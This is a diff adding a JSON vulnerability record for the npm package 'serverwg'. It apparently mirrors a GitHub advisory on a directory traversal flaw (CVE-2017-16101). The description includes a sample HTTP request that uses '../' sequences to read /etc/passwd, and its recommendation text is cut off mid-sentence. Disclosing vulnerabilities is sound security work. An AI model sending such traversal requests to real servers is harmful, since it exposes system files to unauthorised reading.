@@ -1,0 +1,32 @@
+{
+  "packageName": "serverwg",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-2f29-pmpx-vj62",
+      "packageName": "serverwg",
+      "title": "Directory Traversal in serverwg",
+      "description": "`serverwg` is a simple http server.\n\n`serverwg` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the URL.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\nand response:\n```\nHTTP/1.1 200 OK\nDate: Wed, 17 May 2017 22:52:08 GMT\nConnection: keep-alive\n\n{contents of /etc/passwd}\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only ",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-2f29-pmpx-vj62",
+      "publishedAt": "2020-09-01T16:52:33Z",
+      "modifiedAt": "2023-09-07T20:42:01Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-2f29-pmpx-vj62"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2017-16101"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": ">= 0.0.0"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
